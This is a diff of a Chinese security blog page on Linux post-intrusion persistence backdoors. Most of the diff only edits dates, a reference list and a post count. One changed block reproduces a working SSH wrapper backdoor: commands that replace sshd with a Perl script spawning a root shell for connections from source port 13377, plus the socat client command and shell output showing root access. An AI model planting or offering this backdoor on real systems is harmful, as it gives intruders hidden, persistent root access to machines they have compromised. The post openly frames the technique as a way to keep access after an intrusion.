@@ -30,7 +30,7 @@
 <meta property="og:description" content="无我相，无人相，无众生相，无寿者相。  在我们入侵目标系统后，我们希望留下一个后门，方便我们下次入侵，比如写一个定时任务来反弹shell。">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2022-01-21T07:26:44.000Z">
-<meta property="article:modified_time" content="2022-02-14T07:14:19.784Z">
+<meta property="article:modified_time" content="2022-02-19T08:44:41.590Z">
 <meta property="article:author" content="ShadowFl0w">
 <meta property="article:tag" content="linux安全">
 <meta name="twitter:card" content="summary">
@@ -227,7 +227,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-02-14 15:14:19" itemprop="dateModified" datetime="2022-02-14T15:14:19+08:00">2022-02-14</time>
+                <time title="修改时间：2022-02-19 16:44:41" itemprop="dateModified" datetime="2022-02-19T16:44:41+08:00">2022-02-19</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -450,7 +450,7 @@
 
 
 <h2 id="9-SSH-wrapper后门"><a href="#9-SSH-wrapper后门" class="headerlink" title="9. SSH wrapper后门"></a>9. SSH wrapper后门</h2><p>服务端</p>
-<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root<span class="symbol">@vuln</span> ~]<span class="meta"># cd /usr/sbin/</span></span><br><span class="line">[root<span class="symbol">@vuln</span> sbin]<span class="meta"># mv sshd ../bin/</span></span><br><span class="line">[root<span class="symbol">@vuln</span> sbin]<span class="meta"># echo <span class="string">&#x27;#!/usr/bin/perl&#x27;</span> &gt;sshd</span></span><br><span class="line">[root<span class="symbol">@vuln</span> sbin]<span class="meta"># echo <span class="string">&#x27;exec &quot;/bin/sh&quot; if(getpeername(STDIN) =~ /^..4A/);&#x27;</span> &gt;&gt;sshd</span></span><br><span class="line">[root<span class="symbol">@vuln</span> sbin]<span class="meta"># echo <span class="string">&#x27;exec&#123;&quot;/usr/bin/sshd&quot;&#125; &quot;/usr/sbin/sshd&quot;,@ARGV,&#x27;</span> &gt;&gt;sshd</span></span><br><span class="line">[root<span class="symbol">@vuln</span> sbin]<span class="meta"># chmod u+x sshd</span></span><br><span class="line">[root<span class="symbol">@vuln</span> sbin]<span class="meta"># systemctl restart sshd</span></span><br><span class="line">[root<span class="symbol">@vuln</span> sbin]<span class="meta">#</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@vuln ~]# cd /usr/sbin/</span><br><span class="line">[root@vuln sbin]# mv sshd ../bin/</span><br><span class="line">[root@vuln sbin]# echo &#x27;#!/usr/bin/perl&#x27; &gt;sshd</span><br><span class="line">[root@vuln sbin]# echo &#x27;exec &quot;/bin/sh&quot; if(getpeername(STDIN) =~ /^..4A/);&#x27; &gt;&gt;sshd</span><br><span class="line">[root@vuln sbin]# echo &#x27;exec&#123;&quot;/usr/bin/sshd&quot;&#125; &quot;/usr/sbin/sshd&quot;,@ARGV,&#x27; &gt;&gt;sshd</span><br><span class="line">[root@vuln sbin]# chmod u+x sshd</span><br><span class="line">[root@vuln sbin]# systemctl restart sshd</span><br><span class="line">[root@vuln sbin]#</span><br></pre></td></tr></table></figure>
 
 <p>客户端</p>
 <figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[root@debian ~]# socat STDIO TCP4:172.16.42.151:22,sourceport=13377</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) 组=0(root)</span><br><span class="line">hostname</span><br><span class="line">vuln</span><br><span class="line"></span><br><span class="line">#如果你想修改源端口，可以用python的struct标准库实现。其中x00x00LF是19526的大端形式，便于传输和处理。</span><br><span class="line"><span class="meta">&gt;&gt;&gt;</span> <span class="python"><span class="keyword">import</span> struct</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt;</span> <span class="python">buffer = struct.pack(<span class="string">&#x27;&gt;I6&#x27;</span>,<span class="number">19526</span>)</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt;</span> <span class="python"><span class="built_in">print</span> <span class="built_in">repr</span>(buffer)</span></span><br><span class="line">&#x27;\x00\x00LF&#x27;</span><br><span class="line"><span class="meta">&gt;&gt;&gt;</span> <span class="python">buffer = struct.pack(<span class="string">&#x27;&gt;I6&#x27;</span>,<span class="number">13377</span>)</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt;</span> <span class="python"><span class="built_in">print</span> buffer</span></span><br><span class="line">4A</span><br></pre></td></tr></table></figure>
@@ -482,6 +482,7 @@
 
 <h2 id="12-参考"><a href="#12-参考" class="headerlink" title="12. 参考"></a>12. 参考</h2><ul>
 <li><a target="_blank" rel="noopener" href="https://whoamianony.top/2021/10/22/Web%E5%AE%89%E5%85%A8/%E6%9C%89%E8%B6%A3%E7%9A%84%20LD_PRELOAD/">https://whoamianony.top/2021/10/22/Web%E5%AE%89%E5%85%A8/%E6%9C%89%E8%B6%A3%E7%9A%84%20LD_PRELOAD/</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xiaoxiaosen/p/13359729.html">https://www.cnblogs.com/xiaoxiaosen/p/13359729.html</a></li>
 </ul>
 
     </div>
@@ -582,7 +583,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">23</span>
+          <span class="site-state-item-count">24</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
